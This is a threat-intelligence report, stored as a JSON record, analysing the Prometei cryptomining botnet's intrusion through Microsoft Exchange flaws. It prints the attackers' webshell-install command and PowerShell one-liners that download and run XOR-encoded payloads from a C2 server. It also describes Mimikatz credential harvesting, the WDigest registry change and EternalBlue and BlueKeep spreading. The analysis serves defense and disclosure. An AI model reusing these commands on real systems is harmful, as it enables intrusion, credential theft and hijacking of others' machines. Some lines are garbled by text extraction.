{
    "id": "734d5e8f-5617-4d3e-be80-edcc4786136b",
    "created_at": "2023-01-12T15:04:52.708493Z",
    "updated_at": "2025-03-27T02:17:27.665063Z",
    "deleted_at": null,
    "sha1_hash": "0559e695b2a2d674219e2c2bf176a44fe88a72db",
    "title": "2021-04-22 - Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities",
    "authors": "",
    "file_creation_date": "2022-05-28T18:25:47Z",
    "file_modification_date": "2022-05-28T18:25:47Z",
    "file_size": 4507215,
    "plain_text": "# Prometei Botnet Exploiting Microsoft Exchange Vulnerabilities\n\n**cybereason.com/blog/prometei-botnet-exploiting-microsoft-exchange-vulnerabilities**\n\nWritten By\nLior Rochberger\n\nApril 22, 2021 | 15 minute read\n\nRecently, the [Cybereason Nocturnus Team responded to several incident response (IR) cases involving infections of the Prometei Botnet](https://www.cybereason.com/blog/authors/cybereason-nocturnus)\nagainst companies in North America, observing that the attackers exploited recently published Microsoft Exchange vulnerabilities (CVE-202127065 and [CVE-2021-26858) in order to penetrate the network and install malware.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858)\n\n\n-----\n\no ete s a odu a a d u t stage c yptocu e cy bot et t at [as](https://blog.talosintelligence.com/2020/07/prometei-botnet-and-its-quest-for-monero.html) st d sco e ed Ju y 0 0 c as bot do s a d u\nversions. To achieve their goal of mining Monero coins, Prometei uses different techniques and tools, ranging from Mimikatz to SMB and RDP\nexploits and other tools that all work together to propagate across the network.\n\nAlthough Prometei was officially discovered in mid-2020, the Cybereason Nocturnus Team found evidence that Prometei might date back as\nfar as 2016 and has been evolving ever since, adding new modules and techniques to its capabilities. The latest versions of Prometei now\nprovide the attackers with a sophisticated and stealthy backdoor that supports a wide range of tasks that make mining Monero coins the least\nof the victims' concerns.\n\nThis report will present the findings of our investigation of the attacks, including the initial foothold sequence of the attackers, the functionality\nof the different components of the malware, the threat actors’ origin and the bot’s infrastructure.\n\n### Key Findings\n\n**• Exploiting Microsoft Exchange Vulnerabilities: Prometei exploits the recently disclosed Microsoft Exchange vulnerabilities associated with**\nthe HAFNIUM attacks to penetrate the network for malware deployment, credential harvesting and more.\n\n**• Wide range of Victims: The victimology is quite random and opportunistic rather than highly targeted, which makes it even more dangerous**\nand widespread. Prometei has been observed to be active in systems across a variety of industries, including: Finance, Insurance, Retail,\nManufacturing, Utilities, Travel, and Construction. It has been observed infecting networks in the U.S., UK and many other European countries,\nas well as countries in South America and East Asia. It was also observed that the threat actors appear to be explicitly avoiding infecting\ntargets in former Soviet bloc countries.\n\n**• Exploiting SMB and RDP Vulnerabilities: The main objective of Prometei is to install the Monero miner component on as many endpoints**\nas it can. To do so, Prometei needs to spread across the network - and for that, it uses many techniques such as known exploits EternalBlue\nand BlueKeep, harvesting credentials, exploiting SMB and RDP exploits, and other components such as SSH client and SQL spreader.\n\n**• Cross-Platform Threat: Prometei has both Windows-based and Linux-Unix based versions, and it adjusts its payload based on the detected**\noperating system, on the targeted infected machines when spreading across the network.\n\n**• Cybercrime with APT Flavor: Threat actors in the cybercrime community continue to adopt APT-like techniques and improve the efficiency**\nof their operations. It is assessed that the Prometei group is financially motivated and operated by Russian-speaking individuals but is not\nbacked by a nation-state. By exploiting the computing resources of multiple endpoints to mine bitcoin, the threat actors behind Prometei can\nearn hefty sums of cryptocurrency over time.\n\n**• Resilient C2 Infrastructure: Prometei is built to interact with four different command and control (C2) servers which strengthens the botnet’s**\ninfrastructure and maintains continuous communications, making it more resistant to takedowns.\n\n**• Older than it Seems: The Prometei Botnet was first discovered in July 2020, but new evidence shows it was seen in the wild as far back as**\n2016. The Prometei Botnet is continuously evolving, with new features and tools observed in the newer versions.\n\n\n-----\n\n_ttac seque ce d ag a_\n\n### Initial Compromise: Exploitation of the Microsoft Exchange Vulnerability\n\nDuring the IR investigation, the Nocturnus Team was able to identify the initial compromise vector, in which the attackers exploited the recently\ndiscovered vulnerabilities in Microsoft Exchange server, which allowed them to perform remote code execution by exploiting the following\nCVEs: [CVE-2021-27065 and](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) [CVE-2021-26858.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858)\n\n[The attackers used this vulnerability to install and execute the China Chopper webshell via the following commands:](https://gist.github.com/JohnHammond/0b4a45cad4f4ed3324939d72dc599883)\n\nSet-OabVirtualDirectory with the Parameters: -ExternalUrl \"http://f/<script language=\"JScript\" runat=\"server\">function Page_Load()\n{eval(Request[\"NO9BxmCXw0JE\"],\"unsafe\");}</script>\" -Identity \"OAB (Default Web Site)\"\n\n$d=\n\n[System.Convert]::FromBase64String('PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVWaWV3U3RhdGU9ImZhbHNlIiAlPg0KPCVAIEltcG9ydC\n\n[io.file]::WriteAllBytes('C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\<file_name>.aspx',$d);\n\nOnce the attackers gained access to the network, they deleted the .aspx webshell file to cover their tracks:\n\ncmd.exe /c del \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\\\frontend\\httpproxy\\owa\\auth\\<file_name>.aspx\"\n\nUsing the webshell, the attackers launched a PowerShell that was then used to download a payload from the following URL:\n\nhttp://178.21.164[.]68/dwn.php?b64=1&d=nethost64C.exe&B=_AMD64,<machine_name>\n\nThe payload is then saved as C:\\windows\\zsvc.exe and executed. This is the start of the Prometei botnet execution:\n\n\n-----\n\n_Attack tree of the initial infection vector as observed in the Cybereason XDR Platform_\n\n### The Prometei Botnet\n\nWhen the first module of the botnet, zsvc.exe, is executed, it starts to “prepare the ground” for the other modules:\n\nIt copies itself into C:\\Windows with the name “sqhost.exe”\n\nIt uses Netsh commands to add a firewall rule that will allow sqhost.exe to create connections over HTTP\nIt checks if there is a registry key named “UPlugPlay”, and if present it deletes it\nIt sets a registry key for persistence as HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UPlugPlay with the\nimage path and command line c:\\windows\\sqhost.exe Dcomsvc\n\nIt creates several registry keys under SOFTWARE\\Microsoft\\Fax\\ and SOFTWARE\\Intel\\support\\ with the names\n_MachineKeyId, EncryptedMachineKeyId and CommId, for later use by the different components for C2 communication._\n\n### Sqhost.exe\n\nSqhost.exe is the main bot module, complete with backdoor capabilities that support a wide range of commands. Sqhost.exe is able to parse\nthe prometei.cgi file from 4 different hardcoded command and control servers. The file contains the command to be executed on the machine.\nThe commands can be used as “stand-alone” native OS commands (cmd commands, WMI, etc.) or can be used to interact with the other\nmodules of the malware located under C:\\Windows\\dell\n\n\n-----\n\n_Embedded C2 domains in Sqhost.exe_\n\nSqhost supports the following commands:\n\n**Call - Execute a program or a file**\n**Start_mining - launch SearchIndexer.exe (the miner) with the file C:\\windows\\dell\\Desktop.dat as its parameters**\n**Start_mining1 - request C:\\windows\\dell\\Desktop.dat from the C2, and then launch SearchIndexer.exe (the miner) with the file**\nC:\\windows\\dell\\Desktop.dat as its parameters\n**Stop_mining - runs cmd.exe with command: “/c taskkill -f -im SearchIndexer.exe”**\n**Wget - download a file**\n**Xwget - download a file, save it, and use XOR to decrypt it**\n**Quit - terminate the bot execution using TerminateProcess**\n**Quit2 - terminate the bot execution without using TerminateProcess**\n**Sysinfo - collect information about the machine (using native APIs and WMIC)**\n**Exec - execute a command**\n**Ver - return the bot version**\n**Enc - get/set the RC4 encryption key**\n**Extip - return the bot's external IP address**\n**Chkport - check if a specific port is open**\n**Search - search for files by name (potentially crypto currency wallets)**\n**Set_timeout - set a period of time for connecting to C2 server**\n**Touch - open a file**\n**Touch_internal - edit a file with a single byte to change access times**\n**Touch_stop - close a file**\n**Update - update the bot version**\n**Set_Autoexec2 - set an automatic execution**\n**Set_Autoexec1 - set an automatic execution**\n**Set_cc1 - set a C2 server**\n**Set_cc0 - set a C2 server**\n\n\n-----\n\n_Some of the tasks supported by Sqhost.exe_\n\nThe execution of the malware encountered in the investigation shows activities performed by the attackers which included tree processes:\ncmd.exe, sqhost.exe and wmic.exe:\n\n_Attack tree of the infection as observed in the Cybereason Defense platform_\n\n**CMD.exe: was used to execute the following commands (some of the commands are broken into individual commands for readability):**\n\nAuditpol /set /subcategory:\"Logon\" /failure:enable Configuring Microsoft Windows\nServer to log all failed logons\nusing [auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol-set)\n\n\n-----\n\nnetsh advfirewall firewall delete rule name=\"Banned brute IPs\"\nnetsh advfirewall firewall add rule name=\"Banned brute IPs\" dir=in interface=any action=block\nlocalip=68.12.114.202,71.181.80.24,179.52.245.208,24.0.176.79,68.161.157.243,\nnetsh advfirewall firewall add rule name=\"Banned brute IPs\" dir=in interface=any action=block\nremoteip=68.12.114.202,71.181.80.24,179.52.245.208,24.0.176.79,68.161.157.243,\n\npowershell.exe \"if(-not (Test-Path 'C:\\windows\\ExchDefender.exe')) {$b64=$(New-Object\nNet.WebClient).DownloadString('http://178.21.164.68/dwn.php?d=ExchDefender.exe&b64=1');$data=\n\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bxor (($i*3) -band\n0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('C:\\windows\\dell\\ExchDefender.exe',$bt);}\"\n\npowershell.exe \"if(-not (Test-Path 'rdpcIip.exe')) {$b64=$(New-Object\nNet.WebClient).DownloadString('http://178.21.164.68/walk278_64.php');$data=\n\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bxor (($i*3) -band\n0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('rdpcIip.exe',$bt);}\"&C:\\Windows\\svchost.exe /sha1chk\n381C17131D13E1203C91720870ECB441F5BE297E miwalk.exe&sqhost.exe /sha1chk\n381C17131D13E1203C91720870ECB441F5BE297E miwalk.exe&C:\\Windows\\svchost.exe /sha1chk\n9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&sqhost.exe /sha1chk\n9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&rdpcIip.exe\n\ntaskkill -f -im rdpcIip.exe&del rdpcIip.exe&powershell.exe \"if(-not (Test-Path '7z.dll')) {(New-Object\nNet.WebClient).DownloadFile('http://178.21.164.68/7z.dll','7z.dll');}if(-not (Test-Path '7z.exe')) {(NewObject Net.WebClient).DownloadFile('http://178.21.164.68/7z.exe','7z.exe');} (New-Object\nNet.WebClient).DownloadFile('http://178.21.164.68/netwalker2.7z','netwalker.7z');\"&7z x netwalker.7z phorhor123 -y&del netwalker.7z\n\ntaskkill -f -im rdpcIip.exe&ping -n 3 127.0.0.1&C:\\Windows\\svchost.exe /sha1chk\n9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&sqhost.exe /sha1chk\n9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&powershell.exe \"if(-not (Test-Path\n'miwalk.exe')) {$b64=$(New-Object\nNet.WebClient).DownloadString('http://178.21.164.68/mi64.php');$data=\n\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;\n\ntaskkill -f -im rdpcIip.exe&ping -n 3 127.0.0.1&C:\\Windows\\svchost.exe /sha1chk\n9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&sqhost.exe /sha1chk\n9623DCD8836C481AA44AE84499F20E2439941A4B rdpcIip.exe&powershell.exe \"if(-not (Test-Path\n'miwalk.exe')) {$b64=$(New-Object\nNet.WebClient).DownloadString('http://178.21.164.68/mi64.php');$data=\n\n[System.Convert]::FromBase64String($b64);$bt=New-Object Byte[]($data.Length);\n\n[int]$j=0;FOR([int]$i=0;$i -lt $data.Length; $i++){$j+=66;$bt[$i]=(((($data[$i]) -bxor (($i*3) -band\n0xFF))-$j) -band 0xFF);}[io.file]::WriteAllBytes('miwalk.exe',$bt);}\"\n\n\nBlocking certain IP addresses\nfrom communicating with the\nmachine. We assess that those IP\naddresses are used by other\nmalware, potentially Miners, and\nthe attackers behind Prometei\nwanted to ensure that all the\nresources of the network are\navailable just for them.\n\nDownloading ExchDefender.exe,\nan additional module of the botnet\ninto C:\\\\Windows\\dell and\nexecutes it.\n\nDownloading rdpcIip.exe, an\nadditional module of the botnet\ninto C:\\\\Windows and executes it.\n\nDownloading 7z.exe and an\narchived file, Netwalker.7z and\nuse the 7zip executable to extract\nthe files in the archive.\n\nDownloading miwalk.exe, an\nadditional module of the botnet\ninto C:\\\\Windows\\.\n\n\nIn addition, it appears the attackers attempted to execute C:\\Windows\\svchost.exe, which is the same file as sqhost.exe, and the attackers\nnamed it as svchost in earlier versions, but it wasn’t downloaded in the attack or in existence by this name. The reference for “svchost.exe”\nresides in different components of the malware, sometimes even in addition to “sqhost”. Our assumption is that it is used either for backwardscompatibility or it is the case that the attackers didn’t bother to change it in some places after renaming the main bot module to “sqhost.exe”.\n\n**Sqhost.exe: executed with “-watchdog” parameter, to make sure that it will keep running on the system.**\n**Wmic.exe: was used to perform reconnaissance commands:**\n\n- wmic ComputerSystem get Model\n\n- wmic OS get lastbootuptime\n\n- wmic baseboard get product\n\n- wmic os get caption\n\n### ExchDefender.exe\n\nExchdefender tries to masquerade as a “Microsoft Exchange Defender”, a non-existent program that masquerades as a legitimate Microsoft\nproduct.\n\nWhen first executed, it creates a service named “Microsoft Exchange Defender” [MSExchangeDefenderPL] that is set to execute the binary\n(from C:\\Windows) with the same command line as seen used with sqhost.exe - “Dcomsvc”:\n\n\n-----\n\n_Output of running Exchdefender.exe_\n\n_Service name and command line used to execute Exchdefender.exe_\n\nExchdefender constantly checks the files within the directory C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth,\na known directory to be used to host WebShells. The malware is specifically interested in the file “ExpiredPasswords.aspx” which was reported\n[to be the name used to obscure the HyperShell backdoor used by APT34 (aka. OilRig). If the file exists, the malware immediately deletes it.](https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/2019-4-20-%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E2%80%94%E2%80%94HighShell%E5%92%8CHyperShell.md)\n\nOur assessment is that this tool is used to “protect” the compromised Exchange Server by deleting potential WebShells so Prometei will\nremain the only malware using its resources.\n\n### SearchIndexer.exe\n\n[SearchIndexer.exe is an open source Monero mining software (XMRig miner). It is executed with the content from “desktop.dat” file as a](https://github.com/xmrig/xmrig)\nparameter, which contains the mining server and the username for the mining server:\n\n_Content of Desktop.dat_\n\nFollowing the investigation, it appears that the user is “banned due to reports of botnet mining” from around March 2021, and it’s very likely\nthat the attackers have changed the user already:\n\n_A massage showing that the user was banned_\n\n### Netwalker.7z\n\nThe Netwalker.7z archive downloaded from the C2 178.21.164[.]68 is password protected, using the password “horhor123”. The content of the\narchive is saved under C:\\Windows\\dell, together with the other components of the bot. The archive contains the following files:\nNethelper2.exe, Nethelper4.exe, Windrlver.exe, a few DLLs,a copy of RdpcIip.exe and a few DLLs used by the bot components:\n\n\n-----\n\n_Content of Netwalker.7z_\n\n### RdpcIip.exe\n\nRdcIip.exe (with a capital “I” instead of a lowercase “L”) is both downloaded directly by sqhost.exe and is also contained in the Netwalker.7z\narchive\". It is a key component of the malware. It has huge (trust us, huge) functionality with different branches with the main purpose being to\ninteract with other components of the malware and make them work all together.\n\nRdpcIip is responsible for some of the most important functions of the malware - harvesting credentials (using another component called\n[Miwalk.exe) and spreading across the network using the stolen credentials as well as using the SMB exploit EternalBlue and the RDP exploit](https://en.wikipedia.org/wiki/EternalBlue)\n[BlueKeep.](https://en.wikipedia.org/wiki/BlueKeep)\n\n### Harvesting Credentials For Spreading\n\n[To harvest credentials, RdpcIip.exe launches another component, Miwalk.exe, a customized version of Mimikatz. The output is saved to](https://github.com/gentilkiwi/mimikatz/wiki)\nssldata2.dll and ssldata2_old.dll, which are text files, and RdpcIip reads those files and tries to validate the credentials and use them for\nspreading across the network.\n\nIn addition, RdpcIip.exe also changes the following registry key to 1 so the credentials are stored in memory and retrieved using techniques\nemployed by Miwalk.exe:\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\n\n_Changing the registry key “UseLogonCredential”_\n\n_Reading the contents of ssldata2.dll and ssldata2_old.dll_\n\nIn addition to using the harvested credentials, RdpcIip also tries to spread across the network by brute-forcing the usernames and passwords\nusing a built-in list of common combinations:\n\n\n-----\n\n_A list of common usernames and passwords embedded in RdpcIip.exe_\n\n### Network Spreading by Exploiting Vulnerabilities\n\nIf RdpcIip can’t spread to other machines using the stolen credentials, it uses the EternalBlue exploit and sends a shellcode to install and\nlaunch the main bot module Sqhost.exe. To use the exploit, the malware downgrades the SMB protocol to SMB1, which is vulnerable to the\nexploit:\n\n_Downgrading the SMB protocol to version 1_\n\nTo use the RDP exploit BlueKeep, the malware uses another component, Bklocal2.exe / Bklocal4.exe (Depending on the OS version), which is\nalso downloaded by Sqhost and located in C:\\Windows\\dell:\n\n\n-----\n\n_Executing the BlueKeep exploit binaries_\n\n### Preparing the Ground for Other Components\n\nRdpcIip also prepares the ground for other components of the bot such as Nethelper, the SQL spreader, Windrlver, and the SSH client.\n\n[It checks if the dependencies for the files are all set, including Mono.security.dll and](https://github.com/mono/mono) [Npgsql.dll. If not, it will download and copy the files to the](https://www.npgsql.org/)\nright folder. Eventually, RdpcIip will execute the components as child processes and use them for its main purpose - spreading:\n\n\n-----\n\n_epa_ _g t e g ou d o_ _et e pe_\n\n### Nethelper2.exe and Nethelper4.exe\n\n[NetHelper is a .NET-based executable that is obfuscated using CryptoObfuscator protector. The main purpose of this module is to create](https://www.ssware.com/cryptoobfuscator/obfuscator-net.htm)\nconnections to SQL servers in the network and try to infect them with the main module, Sqhost.\n\n[To do so, the malware uses the Npgsql library, a .Net data provider for PostgreSQL, and](https://en.wikipedia.org/wiki/PostgreSQL) [Mono, a software platform designed to allow](https://github.com/mono/mono)\ndevelopers to easily create cross platform applications. It checks the arguments received which contain the SQL server found in the network\nand credentials harvested before. The malware then tries to create connection to the server using port 1433 (default for SQL servers) and\n5432 (used for PostgreSQL):\n\n_Creates connection to SQL server on port 1433_\n\n_Creates connection to PostgreSQL server on port 5432_\n\nIf successful, the malware checks the operating system of the SQL server, and operate accordingly:\n\nIf the OS is Windows - uses PowerShell command to download “zsvc.exe” (Sqhost.exe):\n\n_Downloading Prometei main module on a windows machine using PowerShell_\n\n\n-----\n\nt e OS s U based uses o e o t e o o g Cu / get / e ec\n\n_Downloading Prometei main module on a Unix based machine using different methods_\n\n### Windrlver.exe\n\nWindlver.exe (with a lowercase “L” and not a capital “i”) is an OpenSSH and SSLib-based software that the attackers have created so they can\nspread across the network using SSH. Since it’s used for spreading, it is launched by the spreader component RdpcIip, and downloaded as\npart of the Netwalker.7z archive.\n\nWhen launched, the remote server is passed as a parameter, and it tries to login to the servers using the stolen credentials and using a\npredefined list of usernames and passwords (the same list in RdpcIip, since it is the component that executes Windrlver). In addition, it also\ntries default servers usernames such as: root, admin, user and netup123 (the default user for NetUP servers):\n\n_Different usernames used to login to remote servers by Windrlver_\n\nIf successful, the bot will try to copy and execute the main bot module Sqhost.exe on the remote server.\n\n### Infrastructure And Tools\n\nPrometei, same as other botnets, has a diverse infrastructure designed to ensure the botnet is alive and infected machines stay part of the\nbotnet. Over the years, different Prometei C2 servers were taken down by authorities, and the attackers had to constantly work their way\naround it. We assess that this is one of the reasons why the main bot contains not just one, but four different C2 servers in the newer versions.\n\nPrometei botnet tries to hide it’s malicious activities by masquerading different components as native OS processes, sometimes using the\nname of the file as-is. For example, the Sqhost.exe file is sometimes purposely misspelled to make it look like another file,and RdpcIip.exe\n(with a capital “i” instead of a lowercase “L”) is used in the legitimate OS process name.\n\nBesides keeping the masquerading techniques from its early days, Prometei has also kept a consistent naming convention and URL pattern,\nwhich makes tracking its components and infrastructure relatively easy. For example, all the way back to the first version analyzed by\nCybereason, the attackers used the same file names, such as:\n\nC:\\dell\\searchindexer.exe\nC:\\dell\\desktop dat\n\n\n-----\n\nC \\ do s\\s c ost e e\n\nFor a full list of servers, see IOCs list.\n\n### All the Way Back to 2016\n\nAs mentioned previously, Prometei was discovered in July 2020, and according to the researcher who discovered it, the botnet was active as\nearly as the beginning of March 2020. Our research reveals that Prometei actually has been around since at least 2016.\n\nFollowing the infrastructure of the botnet, most of which was taken down by authorities, we were able to find the following:\n\nA Prometei.cgi file that contains the command “ver” (show the bot version), which was found in the wild in May 2016:\n\n_VT screenshot: SHA-256: cf542ada135ee3edcbbe7b31003192c75295c7eff0efe7593a0a0b0f792d5256_\n\nIn 2017, the attackers named the main component “download.exe” (later changed to “svchost.exe” and now “qhost.exe”). They also used\na certificate to sign the binaries:\n\n_VT screenshot: SHA-256: fdcf4887a2ace73b87d1d906b23862c0510f4719a6c159d1cde48075a987a52f_\n\n### Every Tool and its Own PDB\n\nThe Prometei Botent evolved over the years by adding new tools and expanding its supported commands. In 2019, it appears that the malware\nwas significantly updated with a lot of tools added in a short period of time. In our analysis we didn’t go over all the tools, since the attackers\ndon’t always use them all, and it can change from one attack to another. Our research revealed a shared PDB pattern used for the tools, that\nalso reveals some information about them, such as purpose and obfuscator used:\n\nC:\\WORK\\Tools_2019\\walker\\DOTNETPlugin\\pgbrute\\bin\\Release\\CryptoObfuscator_Output\\nethelper.pdb\n\nC:\\WORK\\Tools_2019\\walker\\bklocal\\BlueKeep\\bin\\Release\\CryptoObfuscator_Output\\BlueKeep.pdb\n\nC:\\Work\\Tools_2019\\walker\\netwalker\\x64\\Release\\rdpcIip.pdb\n\nC:\\Work\\Tools_2019\\prometei\\rdpexec\\psexec\\Release\\psexec.pdb\n\nC:\\Work\\Tools_2019\\prometei\\rdpexec\\shift - bot\\Release\\shift.pdb\n\nC:\\Work\\Tools_2019\\prometei\\scan_rdp\\rdp_checker\\MyRDP\\SampleRDC\\bin\\Release\\CryptoObfuscator_Output\\socks.pdb\n\nC:\\WORK\\Tools_2019\\prometei\\RDPBrute2016.NET\\RDPDetect\\bin\\Release\\CryptoObfuscator_Output\\nvsync.pdb\n\nC:\\WORK\\Tools 2019\\prometei\\nvstub\\Release\\nvstub pdb\n\n\n-----\n\nC \\ o \\ oo s_ 0 9\\p o ete \\ stub\\ e ease\\ stub pdb\n\nC:\\Work\\Tools_2019\\prometei\\scan_rdp\\rdp_checker\\RDPDetect (rdp_checker)\\RDPDetect\\bin\\Release\\CryptoObfuscator_Output\\nethost.pdb\n\nC:\\Work\\Tools_2019\\prometei\\psbrute\\Release\\psbrute.pdb\n\nC:\\Work\\Tools_2019\\prometei\\RDPBrute2016.NET\\RDPDetect\\bin\\Release\\CryptoObfuscator_Output\\nvsync.pdb\n\nC:\\Work\\Tools_2019\\prometei\\rdpexec\\shift - bot\\Release\\shift.pdb\n\nC:\\Work\\Tools_2019\\misc\\tor_hidden_svc\\darkread\\x64\\Release\\darkread.pdb\n\nC:\\Work\\Tools_2019\\misc\\util\\chk445\\Release\\chk445.pdb\n\nC:\\Work\\Tools_2019\\misc\\util\\crawler\\Release\\crawler.pdb\n\n### The Threat Actor\n\nNot much is known about the threat actor behind Prometei. We were able to collect evidence that suggests the threat actors are Russian\nspeaking, and in addition it appears that they attempt to avoid infecting other Russians Speakers. We also can not ignore the name of the bot “Prometei”, which is the Russian word for Prometheus, the Titan god of fire from the Greek mythology.\n\nIn addition, in the older versions of the malware created back in 2016, there were a few samples of “svchost.exe” (the main bot module) that\nthe author of the malware forgot to edit the “product name” and left it in Russian. Also, some of the files have a language code “Russian”:\n\nSvchost.exe without proper metadata editing The language code of svchost.exe\n\nPrometei uses different modules, and not all of them are observed in use in every attack. One of the Prometei components is related to a TOR\nclient installation on the infected machine used to communicate with a TOR C2. As part of the installation, the malware also drops a\nconfiguration file (torrc) that is configured to avoid using several exit nodes, all in the Soviet Union:\n\n_Content of torrc file in the installation of the TOR client by Prometei_\n\nIn addition, Prometei has another component named nvsync.exe that seems to be an older version of Nethelper, and it contains a function that\nchecks the stolen credentials to avoid certain targets, among them are “Guest” and “Other user” - in Russian: Гость, Другой пользователь:\n\n_Function in nvsync.exe - a component of the Prometei bot_\n\n### Conclusion\n\n\n-----\n\ns s o t s epo t, o ete s a co p e a d u t stage bot et t at, due to ts stea t es a d de a ge o capab t es, puts t e\ncompromised network at great risk. The different components work together to enable the malware to perform many tasks: credential\nharvesting, spreading across the network, establishing C2 communications and more. The malware authors are able to add more modules and\nexpand their capabilities easily, and potentially even shift to another payload objective, more destructive than just mining Monero.\n\nThreat actors in the cybercrime community continue to adopt APT-like techniques and improve efficiency of their operations. As observed in\nthe recent Prometei attacks, the threat actors rode the wave of the recently discovered Microsoft Exchange vulnerabilities and exploited them\nin order to penetrate targeted networks. We anticipate continued evolution of the advanced techniques being used by different threat actors for\ndifferent purposes, including cybercrime groups. This puts defenders in a position where they should always be prepared, not only for APT and\nnation state actors, but also for advanced cybercriminals who try to emulate the big APT groups.\n\nAlthough the Prometei techniques and some of its components will likely be detected by security analysts, most of them will not be immediately\nobvious to end-users, which highlights the importance of having a security team and products in place that can detect these malicious\noperations. This threat poses a great risk for organizations, since the attackers have absolute control over the infected machines, and if they\nwish so, they can steal information, infect the endpoints with other malware or even collaborate with ransomware gangs by selling the access\nto the infected endpoints. Lastly, since cryptomining can be resource-hogging, it can affect the performance and stability of critical servers and\nendpoints, ultimately affecting business continuity.\n\n_We would like to thank Matt Hart and Niamh O’Connor for their contribution to these investigation efforts._\n\n**LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN.**\n\n### MITRE ATT&CK BREAKDOWN\n\n\n**Initial**\n**Access**\n\nExploit\nPublicFacing\nApplication\n\n\n**Execution** **Persistence** **Defense**\n**Evasion**\n\n\n**Credential**\n**Access**\n\n\n**Discovery** **Lateral**\n**Movement**\n\n\n**Impact**\n\nResource\nHijacking\n\n\nSystem\nServices\n\n\nCreate or Modify\n[System Process:](https://attack.mitre.org/techniques/T1543/003/)\nWindows Service\n\n\n[Masquerading](https://attack.mitre.org/techniques/T1036/) Credentials\nfrom\nPassword\nStores\n\n\nExploitation\n[of Remote](https://attack.mitre.org/techniques/T1210/)\nServices\n\nLateral Tool\nTransfer\n\n\n**Command**\n**& Control**\n\nApplication\n[Layer](https://attack.mitre.org/techniques/T1071/)\nProtocol\n\nData\nEncoding\n\nMulti[Stage](https://attack.mitre.org/techniques/T1104/)\nChannels\n\n\n[Native API](https://attack.mitre.org/techniques/T1106/) Valid\nAccounts\n\nWindows\n[Management](https://attack.mitre.org/techniques/T1047/)\nInstrumentation\n\n## Prometei Botnet | Indicators of Compromise\n\n\nOS\n[Credential](https://attack.mitre.org/techniques/T1003/)\nDumping\n\nUnsecured\nCredentials\n\n\nSystem\n[Information](https://attack.mitre.org/techniques/T1082/)\nDiscovery\n\nSystem\n[Service](https://attack.mitre.org/techniques/T1007/)\nDiscovery\n\nNetwork\n[Share](https://attack.mitre.org/techniques/T1135/)\nDiscovery\n\n\n[Brute Force](https://attack.mitre.org/techniques/T1110/) Process\nDiscovery\n\n\n**Indicator** **Type** **Comment**\n\n\nP1.feefreepool.net\n\nxmr.feefreepool.net\n\ngb7ni5rgeexdcncj.onion\n\nrongo.prohash.org\n\nbk1.bitspiritfun2.net\n\nmkhkjxgchtfgu7uhofxzgoawntfzrkdccymveektqgpxrpjb72oq.zero\n\ndummy.zero\n\ncp22.umbrellapool.club\n\n193.160.102.91.in-addr.arpa\n\n102.72.239.193.in-addr.arpa\n\n183.247.34.37.in-addr.arpa\n\ncp23.umbrellapool.club\n\nbk2.bitspiritfun2.net\n\n\nDomain C2\n\n\n-----\n\n217.165.8.218\n\n77.92.138.51\n\n91.102.160.193\n\n103.11.244.221\n\n121.200.54.85\n\n112.109.89.53\n\n178.21.164.68\n\n69.84.240.57\n\n208.66.132.3\n\n\nIP C2\n\n\nf0a5b257f16c4ccff520365ebc143f09ccf233e642bf540b5b90a2bbdb43d5b4 SHA256 Sqhost.exe / zsvc.exe\n\nd8e3e22997533300c097b47d71feeda51dca183c35a0d818faa12ee903e969d5 SHA256 ExchDefender.exe\n\nb0e743517e7abf75a80b81bb7aadc9c166ac47ba89c0654ba855dda1e4d96c3e SHA256 SearchIndexer.exe\n\n55fc69a7e1b2371d8762be0b4f403d32db24902891fdbfb8b7d2b7fd1963f1b4 SHA256 Netwalker.7z\n\ne4bd40643f64ac5e8d4093bddee0e26fcc74d2c15ba98b505098d13da22015f5 SHA256 RdpcIip.exe\n\nfb8f100e646dec8f19cb439d4020b5f5f43afdc2414279296e13469f13a018ca SHA256 Miwalk\n\n\nf86f9d0d3ea06bd4be6ee84c09bd13e43ecfcc71653d15994a39e55c2d6bd664\n\ne961c07d534bc1cb96f159fce573fc671bd188cef8756ef32acd9afb49528331\n\n2f114862bd999c38b69b633488bcbb6c74c9a11e28b7ef335f6c77bba32ed2d6\n\n5de7afdde08f7b8ba705c8332c693747d537fd5b1bb0e7b0c757c0f364a60eb8\n\n\nSHA256 Bklocal2.exe / Bklocal4.exe\n\nSHA256 Nethelper2.exe / Nethelper4.exe\n\n\ndc73a88f544efc943da73c9f6535facdb61800f6205ad3dddb9adb7c6ab229ab SHA256 Windrlver.exe\n\n\n-----\n\nAbout the Author\n\n**Lior Rochberger**\n\nLior is a senior 